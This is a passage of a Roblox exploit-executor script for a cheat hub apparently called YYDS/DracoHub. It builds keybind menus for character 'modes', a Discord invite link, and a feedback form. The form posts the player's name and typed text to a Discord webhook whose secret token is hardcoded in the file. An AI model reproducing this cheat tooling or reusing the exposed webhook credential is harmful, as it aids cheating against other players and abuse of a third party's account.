	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local b = ch:FindFirstChildWhichIsA("TextBox")
	if b then
	table.insert(parts, string.sub(string.upper(tostring(b.Text or "")), 1, 1))
	end
	end
	end
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "K:") then
	raw = string.gsub(raw, "K:[A-Z0-9,]*", "K:" .. table.concat(parts, ","))
	else
	if raw ~= "" and string.sub(raw, -1) ~= "\n" then
	raw = raw .. "\n"
	end
	raw = raw .. "K:" .. table.concat(parts, ",")
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset Kira"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"V", "Z", "X", "C", "R"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local b = ch:FindFirstChildWhichIsA("TextBox")
	if b and defs[n] then
	b.Text = defs[n]
	end
	end
	end
	pcall(function()
	local raw = ""
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	end
	if string.find(raw, "K:") then
	raw = string.gsub(raw, "K:[A-Z0-9,]*", "K:V,Z,X,C,R")
	else
	if raw ~= "" then
	raw = raw .. "\n"
	end
	raw = raw .. "K:V,Z,X,C,R"
	end
	writefile("yyds_modebind_dev_v3.txt", raw)
	end)
	end)
	end
	if nm == "Homelander" then
	local skills = {
	{"Tear", "Z"},
	{"Flashstrike", "X"},
	{"Laser", "C"},
	{"Kick", "V"},
	{"Upthrow", "B"}
	}
	pcall(function()
	if isfile and isfile("yyds_modebind_dev_v3.txt") then
	local raw = tostring(readfile("yyds_modebind_dev_v3.txt") or "")
	local body = string.match(raw, "H:([A-Z0-9,]+)")
	if body then
	local i = 0
	for tok in string.gmatch(body, "[A-Z0-9]") do
	i = i + 1
	if skills[i] then
	skills[i][2] = tok
	end
	end
	end
	end
	end)
	for si = 1, #skills do
	local pair = skills[si]
	local line = Instance.new("Frame")
	line.Size = UDim2.new(1, 0, 0, 24)
	line.Position = UDim2.new(0, 0, 0, (si - 1) * 26)
	line.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	line.Parent = bindBody
	Instance.new("UICorner", line).CornerRadius = UDim.new(0, 4)
	local sl = Instance.new("TextLabel")
	sl.Size = UDim2.new(1, -40, 1, 0)
	sl.Position = UDim2.new(0, 6, 0, 0)
	sl.BackgroundTransparency = 1
	sl.Text = pair[1]
	sl.TextColor3 = Color3.fromRGB(220, 220, 220)
	sl.Font = Enum.Font.Gotham
	sl.TextSize = 10
	sl.TextXAlignment = Enum.TextXAlignment.Left
	sl.Parent = line
	local kb = Instance.new("TextBox")
	kb.Size = UDim2.new(0, 28, 0, 20)
	kb.Position = UDim2.new(1, -30, 0.5, -10)
	kb.BackgroundColor3 = Color3.fromRGB(32, 32, 36)
	kb.BorderSizePixel = 0
	kb.TextColor3 = Color3.fromRGB(240, 240, 240)
	kb.Font = Enum.Font.GothamBold
	kb.TextSize = 11
	kb.Text = pair[2]
	kb.PlaceholderText = pair[2]
	kb.ClearTextOnFocus = true
	kb.TextXAlignment = Enum.TextXAlignment.Center
	kb.Parent = line
	Instance.new("UICorner", kb).CornerRadius = UDim.new(0, 4)
	kb:GetPropertyChangedSignal("Text"):Connect(function()
	local s = string.upper(tostring(kb.Text or ""))
	s = string.gsub(s, "[^A-Z0-9]", "")
	s = string.sub(s, 1, 1)
	if s == "" then
	return
	end
	kb.Text = s
	pcall(function()
	kb:ReleaseFocus()
	end)
	pcall(function()
	local parts = {}
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	local b = ch:FindFirstChildWhichIsA("TextBox")
	if b then
	table.insert(parts, string.sub(string.upper(tostring(b.Text or "")), 1, 1))
	end
	end
	end
	writefile("yyds_modebind_dev_v3.txt", "H:" .. table.concat(parts, ","))
	end)
	end)
	end
	local rst = Instance.new("TextButton")
	rst.Size = UDim2.new(1, 0, 0, 22)
	rst.Position = UDim2.new(0, 0, 0, #skills * 26 + 6)
	rst.BackgroundColor3 = Color3.fromRGB(70, 40, 40)
	rst.TextColor3 = Color3.fromRGB(255, 255, 255)
	rst.Font = Enum.Font.GothamBold
	rst.TextSize = 10
	rst.Text = "Reset Homelander"
	rst.Parent = bindBody
	Instance.new("UICorner", rst).CornerRadius = UDim.new(0, 4)
	rst.MouseButton1Click:Connect(function()
	local defs = {"Z", "X", "C", "V", "B"}
	local n = 0
	for _, ch in ipairs(bindBody:GetChildren()) do
	if ch:IsA("Frame") then
	n = n + 1
	local b = ch:FindFirstChildWhichIsA("TextBox")
	if b and defs[n] then
	b.Text = defs[n]
	end
	end
	end
	pcall(function()
	writefile("yyds_modebind_dev_v3.txt", "H:Z,X,C,V,B")
	end)
	end)
	end
	sc.Visible = false
	bindSub.Visible = true
	end)
	end
	local folded = true
	foldAr.MouseButton1Click:Connect(function()
	folded = not folded
	for i = 1, #charRows do
	charRows[i].Visible = not folded
	end
	if folded then
	foldAr.Text = "v"
	sc.CanvasSize = UDim2.new(0, 0, 0, 110)
	else
	foldAr.Text = "^"
	sc.CanvasSize = UDim2.new(0, 0, 0, 270)
	end
	end)
	sc.CanvasSize = UDim2.new(0, 0, 0, 110)
	end
	gear.MouseButton1Click:Connect(function()
	Page1.Visible = false
	Page2.Visible = false
	settingsPage.Visible = true
	end)
end
local TestLabel = Instance.new("TextLabel")
TestLabel.Name = "BugOrSuggestions"
TestLabel.Size = UDim2.new(1, -10, 0, 14)
TestLabel.Position = UDim2.new(0, 5, 0, 434)
TestLabel.BackgroundTransparency = 1
TestLabel.Text = "Bug or Suggestions"
TestLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TestLabel.Font = Enum.Font.GothamBold
TestLabel.TextSize = 12
TestLabel.TextScaled = true
TestLabel.TextXAlignment = Enum.TextXAlignment.Center
TestLabel.Parent = Page2Scroll
do
	local box = Instance.new("TextBox")
	box.Name = "FeedbackBox"
	box.Size = UDim2.new(1, -20, 0, 26)
	box.Position = UDim2.new(0, 10, 0, 452)
	box.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
	box.TextColor3 = Color3.fromRGB(240, 240, 240)
	box.PlaceholderText = "Please type..."
	box.PlaceholderColor3 = Color3.fromRGB(120, 120, 120)
	box.Text = ""
	box.Font = Enum.Font.Gotham
	box.TextSize = 11
	box.TextWrapped = true
	box.ClearTextOnFocus = false
	box.Parent = Page2Scroll
	local boxCorner = Instance.new("UICorner")
	boxCorner.CornerRadius = UDim.new(0, 4)
	boxCorner.Parent = box
	local sendBtn = Instance.new("TextButton")
	sendBtn.Name = "FeedbackSend"
	sendBtn.Size = UDim2.new(1, -20, 0, 22)
	sendBtn.Position = UDim2.new(0, 10, 0, 482)
	sendBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 160)
	sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	sendBtn.Font = Enum.Font.GothamBold
	sendBtn.TextSize = 12
	sendBtn.Text = "Send"
	sendBtn.Parent = Page2Scroll
	local sendCorner = Instance.new("UICorner")
	sendCorner.CornerRadius = UDim.new(0, 4)
	sendCorner.Parent = sendBtn
	local note = Instance.new("TextLabel")
	note.Name = "FeedbackNote"
	note.Size = UDim2.new(1, -16, 0, 28)
	note.Position = UDim2.new(0, 8, 0, 482)
	note.BackgroundTransparency = 1
	note.Text = ""
	note.TextColor3 = Color3.fromRGB(160, 160, 160)
	note.Font = Enum.Font.Gotham
	note.TextSize = 9
	note.TextWrapped = true
	note.TextXAlignment = Enum.TextXAlignment.Center
	note.Visible = false
	note.Parent = Page2Scroll
	local discTitle = Instance.new("TextLabel")
	discTitle.Name = "DiscordTitle"
	discTitle.Size = UDim2.new(1, -10, 0, 16)
	discTitle.Position = UDim2.new(0, 5, 0, 514)
	discTitle.BackgroundTransparency = 1
	discTitle.Text = "Discord"
	discTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
	discTitle.Font = Enum.Font.GothamBold
	discTitle.TextSize = 12
	discTitle.TextXAlignment = Enum.TextXAlignment.Center
	discTitle.Parent = Page2Scroll
	local discLink = Instance.new("TextButton")
	discLink.Name = "DiscordLink"
	discLink.Size = UDim2.new(1, -36, 0, 22)
	discLink.Position = UDim2.new(0, 5, 0, 532)
	discLink.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
	discLink.TextColor3 = Color3.fromRGB(160, 190, 255)
	discLink.Font = Enum.Font.Gotham
	discLink.TextSize = 9
	discLink.TextScaled = true
	discLink.Text = "https://discord.gg/uvFEsP6g3y"
	discLink.Parent = Page2Scroll
	local discLinkCorner = Instance.new("UICorner")
	discLinkCorner.CornerRadius = UDim.new(0, 4)
	discLinkCorner.Parent = discLink
	local discCopy = Instance.new("TextButton")
	discCopy.Name = "DiscordCopy"
	discCopy.Size = UDim2.new(0, 22, 0, 22)
	discCopy.Position = UDim2.new(1, -27, 0, 532)
	discCopy.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
	discCopy.TextColor3 = Color3.fromRGB(230, 230, 230)
	discCopy.Font = Enum.Font.SourceSansBold
	discCopy.TextSize = 16
	discCopy.Text = "📋"
	discCopy.Parent = Page2Scroll
	local discCopyCorner = Instance.new("UICorner")
	discCopyCorner.CornerRadius = UDim.new(0, 4)
	discCopyCorner.Parent = discCopy
	local discUrl = "https://discord.gg/uvFEsP6g3y"
	discLink.MouseButton1Click:Connect(function()
	pcall(function()
	setclipboard(discUrl)
	end)
	pcall(function()
	toclipboard(discUrl)
	end)
	discLink.Text = "Copied"
	task.delay(1, function()
	if discLink and discLink.Parent then
	discLink.Text = discUrl
	end
	end)
	end)
	discCopy.MouseButton1Click:Connect(function()
	pcall(function()
	setclipboard(discUrl)
	end)
	pcall(function()
	toclipboard(discUrl)
	end)
	discLink.Text = "Copied"
	task.delay(1, function()
	if discLink and discLink.Parent then
	discLink.Text = discUrl
	end
	end)
	end)
	local webhook = "https://discord.com/api/webhooks/1546107100164399164/Gw-g1bmwLqMvqQX7pourTEfJjiQ0pW29JWu31FQ26owyeJr6dqcS1zVkw0GLdVwxpShR"
	local sentAlready = false
	sendBtn.MouseButton1Click:Connect(function()
	if sentAlready then
	return
	end
	local text = tostring(box.Text or "")
	if text:match("^%s*$") then
	sendBtn.Text = "Please type something"
	task.delay(1.2, function()
	if not sentAlready then
	sendBtn.Text = "Send"
	end
	end)
	return
	end
	if #text > 500 then
	text = string.sub(text, 1, 500) .. "..."
	end
	sentAlready = true
	sendBtn.Visible = true
	sendBtn.Active = false
	sendBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
	sendBtn.Text = "20s"
	note.Visible = true
	note.Position = UDim2.new(0, 8, 0, 482)
	note.Size = UDim2.new(1, -16, 0, 26)
	note.TextSize = 9
	note.Text = "Sending..."
	task.spawn(function()
	local HttpService = game:GetService("HttpService")
	local body = HttpService:JSONEncode({
	username = "YYDS Feedback",
	content = "**Bug/Suggestions** | `" .. tostring(LocalPlayer.Name) .. "` (" .. tostring(LocalPlayer.DisplayName) .. ")\n>>> " .. text
	})
	local ok = pcall(function()
	local reqFunc = nil
	pcall(function()
	if syn and syn.request then reqFunc = syn.request end
	end)
	if not reqFunc then
	pcall(function()
	if http_request then reqFunc = http_request end
	end)
	end
	if not reqFunc then
	pcall(function()
	if request then reqFunc = request end
	end)
	end
	if not reqFunc then
	pcall(function()
	if fluxus and fluxus.request then reqFunc = fluxus.request end
	end)
	end
	if reqFunc then
	reqFunc({
	Url = webhook,
	Method = "POST",
	Headers = { ["Content-Type"] = "application/json" },
	Body = body
	})
	else
	HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson)
	end
	end)
	if ok then
	sentAlready = true
	box.TextEditable = false
	box.TextWrapped = true
	box.TextSize = 8
	box.Size = UDim2.new(1, -20, 0, 26)
	box.Text = "Sent. Thanks for your feedback."
	box.TextColor3 = Color3.fromRGB(140, 220, 160)
	note.Visible = false
	note.Text = ""
	sendBtn.Visible = true
	sendBtn.Active = false
	sendBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
	sendBtn.TextColor3 = Color3.fromRGB(180, 200, 230)
	sendBtn.Text = "20s"
	task.spawn(function()
	for n = 19, 1, -1 do
	task.wait(1)
	if sendBtn and sendBtn.Parent then
	sendBtn.Text = tostring(n) .. "s"
	sendBtn.BackgroundColor3 = Color3.fromRGB(20, 40, 70)
	end
	end
	task.wait(1)
	sentAlready = false
	if box and box.Parent then
	box.TextEditable = true
	box.Text = ""
	box.TextSize = 11
	box.Size = UDim2.new(1, -20, 0, 26)
	box.TextColor3 = Color3.fromRGB(240, 240, 240)
	box.PlaceholderText = "Please type..."
	end
	if sendBtn and sendBtn.Parent then
	sendBtn.Active = true
	sendBtn.Visible = true
	sendBtn.BackgroundColor3 = Color3.fromRGB(50, 100, 160)
	sendBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	sendBtn.Text = "Send"
	end
	end)
	else
	sentAlready = false
	sendBtn.Visible = true
	sendBtn.Active = true
	sendBtn.Text = "Failed"
	note.Position = UDim2.new(0, 8, 0, 482)
	note.Size = UDim2.new(1, -16, 0, 28)
	note.TextSize = 9
	note.Text = ""
	note.Visible = false
	note.TextColor3 = Color3.fromRGB(160, 160, 160)
	task.delay(1.5, function()
	if not sentAlready then
	sendBtn.Text = "Send"
	end
	end)
	end
	end)
	end)
end
local ATrainIcon = Instance.new("ImageLabel")
ATrainIcon.Size = UDim2.new(0, 24, 0, 24)
ATrainIcon.Position = UDim2.new(0, 5, 0, 64)
ATrainIcon.BackgroundTransparency = 1
ATrainIcon.Image = "rbxassetid://129724390385413"
ATrainIcon.ScaleType = Enum.ScaleType.Fit
ATrainIcon.Parent = Page2Scroll
local ATrainModBtn = Instance.new("TextButton")
ATrainModBtn.Size = UDim2.new(1, -40, 0, 24)
ATrainModBtn.Position = UDim2.new(0, 30, 0, 64)
ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
ATrainModBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ATrainModBtn.Font = Enum.Font.GothamBold
ATrainModBtn.TextSize = 12
ATrainModBtn.Text = "A-Train"
ATrainModBtn.TextScaled = true
ATrainModBtn.TextXAlignment = Enum.TextXAlignment.Center
ATrainModBtn.Parent = Page2Scroll
local ATrainModCorner = Instance.new("UICorner") ATrainModCorner.CornerRadius = UDim.new(0,4) ATrainModCorner.Parent = ATrainModBtn
local KiraModBtn = Instance.new("TextButton")
KiraModBtn.Size = UDim2.new(1, -40, 0, 24)
KiraModBtn.Position = UDim2.new(0, 30, 0, 104)
KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
KiraModBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
KiraModBtn.Font = Enum.Font.GothamBold
KiraModBtn.TextSize = 12
KiraModBtn.Text = "Kira"
KiraModBtn.TextScaled = true
KiraModBtn.TextXAlignment = Enum.TextXAlignment.Center
KiraModBtn.Parent = Page2Scroll
local KiraModCorner = Instance.new("UICorner")
KiraModCorner.CornerRadius = UDim.new(0, 4)
KiraModCorner.Parent = KiraModBtn
do
	local kiraPic = Instance.new("ImageLabel")
	kiraPic.Size = UDim2.new(0, 24, 0, 24)
	kiraPic.Position = UDim2.new(0, 5, 0, 104)
	kiraPic.BackgroundTransparency = 1
	kiraPic.Image = "http://www.roblox.com/asset/?id=132327774383421"
	kiraPic.ScaleType = Enum.ScaleType.Fit
	kiraPic.Parent = Page2Scroll
	local copyBtn = nil
	local healPic1 = Instance.new("ImageLabel")
	healPic1.Name = "XRegenPic1"
	healPic1.Size = UDim2.new(0, 24, 0, 24)
	healPic1.Position = UDim2.new(0, 5, 0, 144)
	healPic1.BackgroundTransparency = 1
	healPic1.Image = "http://www.roblox.com/asset/?id=83731617931763"
	healPic1.ScaleType = Enum.ScaleType.Fit
	healPic1.Parent = Page2Scroll
	local healPic2 = Instance.new("ImageLabel")
	healPic2.Name = "XRegenPic2"
	healPic2.Size = UDim2.new(0, 24, 0, 24)
	healPic2.Position = UDim2.new(0, 31, 0, 144)
	healPic2.BackgroundTransparency = 1
	healPic2.Image = "http://www.roblox.com/asset/?id=133445163583747"
	healPic2.ScaleType = Enum.ScaleType.Fit
	healPic2.Parent = Page2Scroll
	local healBtn = Instance.new("TextButton")
	healBtn.Name = "HealRegenModBtn"
	healBtn.Size = UDim2.new(1, -62, 0, 24)
	healBtn.Position = UDim2.new(0, 57, 0, 144)
	healBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	healBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	healBtn.Font = Enum.Font.GothamBold
	healBtn.TextSize = 11
	healBtn.Text = "X-Regen"
	healBtn.TextScaled = true
	healBtn.TextWrapped = true
	healBtn.TextXAlignment = Enum.TextXAlignment.Left
	healBtn.Parent = Page2Scroll
	local healTest = Instance.new("TextLabel")
	healTest.Name = "TestTag"
	healTest.Size = UDim2.new(0, 28, 0, 10)
	healTest.Position = UDim2.new(1, -30, 0, -1)
	healTest.BackgroundTransparency = 1
	healTest.Font = Enum.Font.GothamBold
	healTest.TextSize = 8
	healTest.TextColor3 = Color3.fromRGB(255, 220, 40)
	healTest.Text = "test"
	healTest.ZIndex = 3
	healTest.Parent = healBtn
	local healCorner = Instance.new("UICorner")
	healCorner.CornerRadius = UDim.new(0, 4)
	healCorner.Parent = healBtn
	local healInPic = Instance.new("ImageLabel")
	healInPic.Name = "DeadpoolPic"
	healInPic.Size = UDim2.new(0, 18, 0, 18)
	healInPic.Position = UDim2.new(0, 3, 0.5, -9)
	healInPic.BackgroundTransparency = 1
	healInPic.Image = "http://www.roblox.com/asset/?id=83731617931763"
	healInPic.ScaleType = Enum.ScaleType.Fit
	healInPic.Visible = false
	healInPic.Parent = healBtn
	local wvBtn = Instance.new("TextButton")
	wvBtn.Name = "XRegenWolverineBtn"
	wvBtn.Size = UDim2.new(0.5, -8, 0, 24)
	wvBtn.Position = UDim2.new(0.5, 2, 0, 144)
	wvBtn.BackgroundColor3 = Color3.fromRGB(214, 158, 28)
	wvBtn.Text = ""
	wvBtn.Visible = false
	wvBtn.Parent = Page2Scroll
	local wvCorner = Instance.new("UICorner")
	wvCorner.CornerRadius = UDim.new(0, 4)
	wvCorner.Parent = wvBtn
	local wvPic = Instance.new("ImageLabel")
	wvPic.Size = UDim2.new(0, 18, 0, 18)
	wvPic.Position = UDim2.new(0, 3, 0.5, -9)
	wvPic.BackgroundTransparency = 1
	wvPic.Image = "http://www.roblox.com/asset/?id=133445163583747"
	wvPic.ScaleType = Enum.ScaleType.Fit
	wvPic.Parent = wvBtn
	local wvLab = Instance.new("TextLabel")
	wvLab.Size = UDim2.new(1, -24, 1, 0)
	wvLab.Position = UDim2.new(0, 22, 0, 0)
	wvLab.BackgroundTransparency = 1
	wvLab.Font = Enum.Font.GothamBold
	wvLab.TextSize = 11
	wvLab.TextScaled = true
	wvLab.TextColor3 = Color3.fromRGB(255, 255, 255)
	wvLab.TextXAlignment = Enum.TextXAlignment.Left
	wvLab.Text = "Wolverine"
	wvLab.Parent = wvBtn
	local skinArr = nil
	local skinPage = nil
	local moreBtn = Instance.new("TextButton")
	moreBtn.Name = "XRegenMoreBtn"
	moreBtn.Size = UDim2.new(1, -10, 0, 20)
	moreBtn.Position = UDim2.new(0, 5, 0, 186)
	moreBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	moreBtn.TextColor3 = Color3.fromRGB(230, 230, 230)
	moreBtn.Font = Enum.Font.GothamBold
	moreBtn.TextSize = 11
	moreBtn.Text = "more mode"
	moreBtn.Visible = true
	moreBtn.Parent = Page2Scroll
	local moreBtnC = Instance.new("UICorner")
	moreBtnC.CornerRadius = UDim.new(0, 4)
	moreBtnC.Parent = moreBtn
	local morePage = Instance.new("Frame")
	morePage.Name = "XRegenMorePage"
	morePage.Size = UDim2.new(1, -10, 0, 70)
	morePage.Position = UDim2.new(0, 5, 0, 186)
	morePage.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
	morePage.Visible = false
	morePage.ZIndex = 30
	morePage.Active = true
	morePage.ClipsDescendants = true
	morePage.Parent = Page2Scroll
	local morePageC = Instance.new("UICorner")
	morePageC.CornerRadius = UDim.new(0, 4)
	morePageC.Parent = morePage
	local moreCatch = Instance.new("TextButton")
	moreCatch.Name = "Catch"
	moreCatch.Size = UDim2.new(1, 0, 1, 0)
	moreCatch.BackgroundTransparency = 1
	moreCatch.Text = ""
	moreCatch.AutoButtonColor = false
	moreCatch.ZIndex = 30
	moreCatch.Parent = morePage
	local myersPic = Instance.new("ImageLabel")
	myersPic.Name = "MyersPic"
	myersPic.Size = UDim2.new(0, 24, 0, 24)
	myersPic.Position = UDim2.new(0, 0, 0, 4)
	myersPic.BackgroundTransparency = 1
	myersPic.Image = "http://www.roblox.com/asset/?id=89521975316886"
	myersPic.ScaleType = Enum.ScaleType.Fit
	myersPic.ZIndex = 31
	myersPic.Parent = morePage
	local myersBtn = Instance.new("TextButton")
	myersBtn.Name = "MyersModBtn"
	myersBtn.Size = UDim2.new(1, -30, 0, 24)
	myersBtn.Position = UDim2.new(0, 25, 0, 4)
	myersBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	myersBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
	myersBtn.Font = Enum.Font.GothamBold
	myersBtn.TextSize = 12
	myersBtn.Text = "Michael Myers"
	myersBtn.TextScaled = true
	myersBtn.TextXAlignment = Enum.TextXAlignment.Center
	myersBtn.ZIndex = 31
	myersBtn.Parent = morePage
	local myersBtnC = Instance.new("UICorner")
	myersBtnC.CornerRadius = UDim.new(0, 4)
	myersBtnC.Parent = myersBtn
	myersBtn.MouseButton1Click:Connect(function()
	local fg = LocalPlayer.PlayerGui:FindFirstChild("DracoHubFloatingButtons")
	if not fg then
	return
	end
	local stalk = fg:FindFirstChild("Stalk")
	local mm = fg:FindFirstChild("MMLifeInsure")
	morePage.Visible = false
	moreBtn.Visible = true
	moreBtn.Position = UDim2.new(0, 5, 0, 186)
	morePage.Position = UDim2.new(0, 5, 0, 186)
	local tbHide = fg:FindFirstChild("TerrorBlade")
	local otherOn = aTrainModActive or kiraAim
	if HomelanderModBtn and HomelanderModBtn.Text == "Cancel" then
	otherOn = true
	end
	local hbO = Page2Scroll:FindFirstChild("HealRegenModBtn")
	if hbO and hbO:GetAttribute("On") == true then
	otherOn = true
	end
	if (not otherOn) and ((stalk and stalk.Visible) or (tbHide and tbHide.Visible) or (mm and mm.Visible)) then
	if stalk then stalk.Visible = false end
	if tbHide then tbHide.Visible = false end
	local sbHide = fg:FindFirstChild("MyersStab")
	if sbHide then sbHide.Visible = false end
	local nkHide = fg:FindFirstChild("NeckSnap")
	if nkHide then nkHide.Visible = false end
	if mm then
	mm.Visible = false
	local mb = mm:FindFirstChild("MmBar")
	if mb then mb.Visible = false end
	end
	return
	end
	homelanderModActive = false
	aTrainModActive = false
	kiraAim = false
	if FinisherButton then FinisherButton.Visible = false end
	if HomelanderModBtn then
	HomelanderModBtn.Text = "Homelander"
	HomelanderModBtn.BackgroundColor3 = Color3.fromRGB(255, 0, 60)
	HomelanderModBtn.Size = UDim2.new(1, -10, 0, 24)
	end
	if ATrainModBtn then
	ATrainModBtn.Text = "A-Train"
	ATrainModBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 184)
	end
	if healBtn then
	healBtn:SetAttribute("On", false)
	healBtn.Text = "X-Regen"
	healBtn.BackgroundColor3 = Color3.fromRGB(38, 40, 42)
	healBtn.Size = UDim2.new(1, -62, 0, 24)
	healBtn.Position = UDim2.new(0, 57, 0, 144)
	end
	if healPic1 then healPic1.Visible = true end
	if healPic2 then healPic2.Visible = true end
	if healInPic then healInPic.Visible = false end
	if wvBtn then wvBtn.Visible = false end
	if skinArr then skinArr.Visible = false end
	if skinPage then skinPage.Visible = false end
	local liW = fg:FindFirstChild("LifeInsure")
	if liW then
	liW.Visible = false
	liW:SetAttribute("On", false)
	liW:SetAttribute("IsWolverine", false)
	local kW = liW:FindFirstChild("Knob")
	local nW = liW:FindFirstChild("NameLab")
	if nW then nW.Visible = true end
	if kW then
	kW.Visible = false
	kW.Position = UDim2.new(0, 4, 0.5, -9)
	end
	local mbW = liW:FindFirstChild("LiMBar")
	local pbW = liW:FindFirstChild("LiPBar")
	if mbW then mbW.Visible = false end
	if pbW then pbW.Visible = false end
	end
	local roarW = fg:FindFirstChild("Roar")
	if roarW then roarW.Visible = false end
	local gunW = fg:FindFirstChild("DeadpoolSkill")
	if gunW then gunW.Visible = false end
	local slW = LocalPlayer.PlayerGui:FindFirstChild("DracoHubShootLayer")
	local shW = slW and slW:FindFirstChild("DeadpoolShoot")
	if shW then shW.Visible = false end
	if HomelanderModBtn then
	HomelanderModBtn.Text = "Homelander"
	end
	if ATrainModBtn then
	ATrainModBtn.Text = "A-Train"
	end
	if KiraModBtn then
	KiraModBtn.Text = "Kira"
	KiraModBtn.BackgroundColor3 = Color3.fromRGB(138, 149, 165)
	end
	if LaserButton then LaserButton.Visible = false end
	if FlashstrikeButton then FlashstrikeButton.Visible = false end
	if KickButton then KickButton.Visible = false end
	if UpthrowButton then UpthrowButton.Visible = false end
	if MoAimButton then MoAimButton.Visible = false end
	if KiraAimButton then KiraAimButton.Visible = false end
	local extra = fg:FindFirstChild("HomeExtra")
	if extra then extra.Visible = false end
	if not stalk then
	stalk = Instance.new("TextButton")
	stalk.Name = "Stalk"
	stalk.BackgroundColor3 = Color3.fromRGB(100, 30, 30)
	stalk.TextColor3 = Color3.fromRGB(255, 255, 255)
	stalk.Font = Enum.Font.GothamBold
	stalk.Text = "Stalk"
	stalk.TextScaled = true
	stalk.TextWrapped = true
	stalk.TextSize = 11
	stalk.Parent = fg
	local sc = Instance.new("UICorner")
	sc.CornerRadius = UDim.new(0, 8)
	sc.Parent = stalk
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	stalk.Size = UDim2.new(0, 44, 0, 44)
	stalk.Position = UDim2.new(0.5, -88, 1, -96)
	else
	stalk.Size = UDim2.new(0, 60, 0, 60)
	stalk.Position = DEFAULT_POSITIONS.MoAim
	end
	stalk.Visible = (LocalPlayer:GetAttribute("YYDSStalkMode") == true)
	stalk.ZIndex = 20
	local tb = fg:FindFirstChild("TerrorBlade")
	if not tb then
	tb = Instance.new("TextButton")
	tb.Name = "TerrorBlade"
	tb.BackgroundColor3 = Color3.fromRGB(70, 20, 90)
	tb.TextColor3 = Color3.fromRGB(255, 255, 255)
	tb.Font = Enum.Font.GothamBold
	tb.Text = "Terror Blade"
	tb.TextScaled = true
	tb.TextWrapped = true
	tb.TextSize = 11
	tb.Parent = fg
	local tbc = Instance.new("UICorner")
	tbc.CornerRadius = UDim.new(0, 8)
	tbc.Parent = tb
	end
	tb.Size = stalk.Size
	tb.Position = stalk.Position
	tb.Visible = (LocalPlayer:GetAttribute("YYDSStalkMode") ~= true)
	tb.ZIndex = 20
	local sbShow = fg:FindFirstChild("MyersStab")
	if not sbShow then
	sbShow = Instance.new("TextButton")
	sbShow.Name = "MyersStab"
	sbShow.BackgroundColor3 = Color3.fromRGB(90, 35, 35)
	sbShow.TextColor3 = Color3.fromRGB(255, 255, 255)
	sbShow.Font = Enum.Font.GothamBold
	sbShow.TextSize = 11
	sbShow.Text = "Stab"
	sbShow.TextWrapped = true
	sbShow.ZIndex = 21
	sbShow.Parent = fg
	local sbc = Instance.new("UICorner")
	sbc.CornerRadius = UDim.new(0, 8)
	sbc.Parent = sbShow
	end
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	sbShow.Size = UDim2.new(0, 44, 0, 44)
	sbShow.Position = UDim2.new(0.5, -88, 1, -96)
	else
	local gun = fg:FindFirstChild("DeadpoolSkill")
	if gun then
	sbShow.Size = gun.Size
	sbShow.Position = gun.Position
	else
	sbShow.Size = UDim2.new(0, 60, 0, 30)
	sbShow.Position = UDim2.new(1, -240, 0.5, -100)
	end
	end
	sbShow.Visible = (LocalPlayer:GetAttribute("YYDSStalkMode") ~= true)
	local nkShow = fg:FindFirstChild("NeckSnap")
	if nkShow then
	if LocalPlayer:GetAttribute("YYDSPC") == true then
	nkShow.Size = UDim2.new(0, 44, 0, 44)
	nkShow.Position = UDim2.new(0.5, -140, 1, -96)
	else
	nkShow.Size = UDim2.new(0, 60, 0, 60)
	nkShow.Position = UDim2.new(1, -310, 0.5, -100)
	end
